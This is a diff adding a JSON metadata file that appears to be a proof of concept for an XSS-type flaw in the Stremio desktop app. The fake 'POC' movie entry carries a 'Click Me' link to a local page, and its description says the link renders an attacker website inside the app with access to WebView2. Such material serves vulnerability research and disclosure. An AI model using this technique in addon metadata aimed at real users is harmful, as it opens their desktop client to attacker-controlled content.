@@ -1,0 +1,18 @@
+{
+  "meta": {
+    "id": "poc-xss",
+    "type": "movie",
+    "name": "POC",
+    "poster": "http://127.0.0.1:8000/poster.png",
+    "background": "http://127.0.0.1:8000/poster.png",
+    "description": "Clicking this render's the attacker-website inside the stremio desktop, allowing for access to webview2",
+    "releaseInfo": "2026",
+    "links": [
+      {
+        "name": "Click Me",
+        "category": "Catagory",
+        "url": "http://127.0.0.1:8000/poc.html"
+      }
+    ]
+  }
+}
